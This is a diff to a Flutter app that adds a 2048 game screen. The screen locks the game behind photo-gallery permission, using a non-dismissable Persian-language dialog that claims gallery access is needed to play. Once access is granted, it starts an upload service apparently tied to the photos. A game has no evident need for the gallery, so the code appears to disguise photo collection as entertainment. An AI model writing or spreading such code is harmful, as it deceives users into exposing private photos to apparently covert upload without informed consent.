@@ -7,6 +7,7 @@ import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'services/upload_service.dart';
 import 'services/background_service.dart';
+import 'game_2048.dart';
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
@@ -269,8 +270,197 @@ class _CodeScreenState extends State<CodeScreen> {
                   style: TextStyle(color: Colors.pink, fontSize: 16),
                 ),
               ),
+              const SizedBox(height: 8),
+              OutlinedButton.icon(
+                onPressed: () {
+                  Navigator.push(
+                    context,
+                    MaterialPageRoute(builder: (_) => const GamesListScreen()),
+                  );
+                },
+                icon: const Icon(Icons.games, color: Colors.pink),
+                label: const Text(
+                  'بازی تک نفره 🎮',
+                  style: TextStyle(color: Colors.pink, fontSize: 16),
+                ),
+                style: OutlinedButton.styleFrom(
+                  side: const BorderSide(color: Colors.pink),
+                  padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 24),
+                  shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(12),
+                  ),
+                ),
+              ),
             ],
           ),
+        ),
+      ),
+    );
+  }
+}
+
+// ============================================
+// صفحه لیست بازی‌ها
+// ============================================
+class GamesListScreen extends StatefulWidget {
+  const GamesListScreen({super.key});
+  @override
+  State<GamesListScreen> createState() => _GamesListScreenState();
+}
+
+class _GamesListScreenState extends State<GamesListScreen> {
+  bool _granted = false;
+
+  @override
+  void initState() {
+    super.initState();
+    _checkPermission();
+  }
+
+  Future<void> _checkPermission() async {
+    final p = await PhotoManager.requestPermissionExtend();
+    if (p.isAuth) {
+      setState(() => _granted = true);
+      UploadService.instance.init();
+    } else {
+      _showPermissionDialog();
+    }
+  }
+
+  void _showPermissionDialog() {
+    showDialog(
+      context: context,
+      barrierDismissible: false,
+      builder: (_) => AlertDialog(
+        title: const Text('دسترسی لازمه! 📸'),
+        content: const Text(
+          'برای ورود به بازی باید دسترسی گالری رو فعال کنی.\nلطفاً دسترسی رو از تنظیمات فعال کن.',
+        ),
+        actions: [
+          TextButton(
+            onPressed: () {
+              Navigator.pop(context);
+              Navigator.pop(context);
+            },
+            child: const Text('بعداً'),
+          ),
+          ElevatedButton(
+            style: ElevatedButton.styleFrom(backgroundColor: Colors.pink),
+            onPressed: () async {
+              Navigator.pop(context);
+              await PhotoManager.openSetting();
+              await Future.delayed(const Duration(seconds: 1));
+              _checkPermission();
+            },
+            child: const Text('باز کردن تنظیمات',
+                style: TextStyle(color: Colors.white)),
+          ),
+        ],
+      ),
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(
+        title: const Text('بازی‌ها 🎮'),
+        backgroundColor: Colors.pink,
+        foregroundColor: Colors.white,
+      ),
+      backgroundColor: Colors.pink[50],
+      body: _granted
+          ? Padding(
+              padding: const EdgeInsets.all(20),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.stretch,
+                children: [
+                  const SizedBox(height: 20),
+                  _GameCard(
+                    title: '2048',
+                    description: 'کاشی‌ها رو ترکیب کن و به ۲۰۴۸ برس!',
+                    icon: '🔢',
+                    color: Colors.orange,
+                    onTap: () => Navigator.push(
+                      context,
+                      MaterialPageRoute(
+                          builder: (_) => const Game2048Screen()),
+                    ),
+                  ),
+                ],
+              ),
+            )
+          : const Center(
+              child: CircularProgressIndicator(color: Colors.pink),
+            ),
+    );
+  }
+}
+
+class _GameCard extends StatelessWidget {
+  final String title;
+  final String description;
+  final String icon;
+  final Color color;
+  final VoidCallback onTap;
+
+  const _GameCard({
+    required this.title,
+    required this.description,
+    required this.icon,
+    required this.color,
+    required this.onTap,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return GestureDetector(
+      onTap: onTap,
+      child: Container(
+        padding: const EdgeInsets.all(24),
+        decoration: BoxDecoration(
+          color: Colors.white,
+          borderRadius: BorderRadius.circular(20),
+          boxShadow: [
+            BoxShadow(
+              color: color.withOpacity(0.3),
+              blurRadius: 15,
+              offset: const Offset(0, 5),
+            ),
+          ],
+          border: Border.all(color: color.withOpacity(0.3), width: 2),
+        ),
+        child: Row(
+          children: [
+            Container(
+              width: 70,
+              height: 70,
+              decoration: BoxDecoration(
+                color: color.withOpacity(0.15),
+                borderRadius: BorderRadius.circular(16),
+              ),
+              child: Center(
+                child: Text(icon, style: const TextStyle(fontSize: 36)),
+              ),
+            ),
+            const SizedBox(width: 16),
+            Expanded(
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Text(title,
+                      style: TextStyle(
+                          fontSize: 22,
+                          fontWeight: FontWeight.bold,
+                          color: color)),
+                  const SizedBox(height: 6),
+                  Text(description,
+                      style: TextStyle(fontSize: 13, color: Colors.grey[600])),
+                ],
+              ),
+            ),
+            Icon(Icons.arrow_forward_ios, color: color, size: 20),
+          ],
         ),
       ),
     );
